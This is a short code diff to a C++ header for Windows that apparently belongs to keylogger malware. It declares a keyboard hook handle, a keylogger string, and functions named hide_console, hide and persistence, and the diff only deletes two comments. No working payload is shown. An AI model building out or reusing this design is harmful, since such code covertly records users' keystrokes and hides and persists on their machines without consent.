@@ -4,12 +4,12 @@
 #include <Windows.h>
 #include <string>
 
-// Global variable declaration (extern)
+
 extern std::string keylogger;
 extern class IO logger;
 extern HHOOK eHook;
 
-// Function declarations
+
 void hide_console();
 void hide(FILE file);
 void persistence();
